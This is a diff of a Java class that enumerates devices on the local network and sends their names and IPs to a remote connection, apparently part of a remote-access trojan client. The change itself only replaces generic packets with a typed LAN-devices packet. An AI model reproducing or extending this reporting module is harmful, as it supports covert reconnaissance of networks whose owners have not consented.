@@ -3,8 +3,7 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.outgoing.Packet49LanDevices;
 
 
 public class Lan extends Thread {
@@ -31,17 +30,17 @@ public class Lan extends Thread {
 						}
 						preader.close();
 						
-						Connection.addToSendQueue(new PacketBuilder(Header.LAN, new String[] { line, ip == null ? "Unknown" : ip }));
+						Connection.addToSendQueue(new Packet49LanDevices(line, ip == null ? "Unknown" : ip ));
 					}
 				}
 				reader.close();
-				Connection.addToSendQueue(new PacketBuilder(Header.LAN, "DONE"));
+				Connection.addToSendQueue(new Packet49LanDevices("DONE", null));
 			} else {
 				throw new Exception();
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
-			Connection.addToSendQueue(new PacketBuilder(Header.LAN, "FAIL"));
+			Connection.addToSendQueue(new Packet49LanDevices("FAIL", null));
 		}
 	}
 
